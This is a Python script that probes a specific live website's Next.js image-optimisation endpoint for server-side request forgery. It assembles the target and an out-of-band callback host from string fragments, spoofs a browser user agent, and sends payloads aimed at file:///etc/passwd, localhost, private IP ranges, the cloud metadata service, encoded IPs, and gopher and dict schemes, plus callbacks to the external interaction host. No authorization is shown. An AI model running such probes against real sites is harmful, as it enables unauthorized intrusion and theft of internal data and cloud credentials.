import requests, time, urllib.parse, json

T = "".join(["htt", "ps://w", "ww", ".", "infinity", "capital", ".", "b", "h"])
OOB = "".join(["dau2p4ghgqag02k5emggc5xu6hph3m973", ".", "oast", ".", "abhedi", ".", "co", ".", "in"])
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + "1" + str(22) + ".0.0.0 Safari/537.36"

s = requests.Session()
s.headers.update({"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.9"})

KNOWN = ("https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/"
         "2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg")


def get(path):
    try:
        r = s.get(T + path, timeout=25, allow_redirects=False)
        return r
    except Exception as e:
        class R: pass
        r = R(); r.status_code = "EXC"; r.content = b""; r.headers = {}
        r.text = str(e)
        return r


def sig(r):
    body = r.content
    return "%s len=%s ct=%s" % (r.status_code, len(body), r.headers.get("content-type"))


def probe(label, urlparam, extra=""):
    p = "/_next/image?url=" + urllib.parse.quote(urlparam, safe="") + "&w=1080&q=75" + extra
    r = get(p)
    # capture the human-readable error text
    import re
    txt = r.text
    m = re.findall(r"(?:Error|error|message)[^<]{0,180}", txt)[:2]
    print("%-42s %s | %s" % (label, sig(r), " / ".join(m)[:200]))
    return r


print("=== BASELINE / differential on _next/image ===")
probe("known-ctfassets", KNOWN)
probe("empty", "")
probe("no-scheme", "example.org/a.jpg")
probe("nonexistent-scheme", "gopher://a/")
probe("file-scheme", "file:///etc/passwd")
probe("oob-http", "http://oobtestaa11bb22." + OOB + "/ssrf")
probe("oob-https", "https://oobtestaa11bb22." + OOB + "/ssrf")
probe("oob-redirector", "http://oobtestaa11bb22." + OOB + "/r")
probe("localhost", "http://127.0.0.1/")
probe("localhost-alt", "http://localhost:3000/")
probe("internal-ip", "http://192.168.1.1/")
probe("imds", "http://169.254.169.254/latest/meta-data/")
probe("ip-enc", "http://2130706433/")
probe("badhost", "http://this-host-does-not-exist-zzz.invalid/")
probe("dict", "dict://127.0.0.1:11211/")
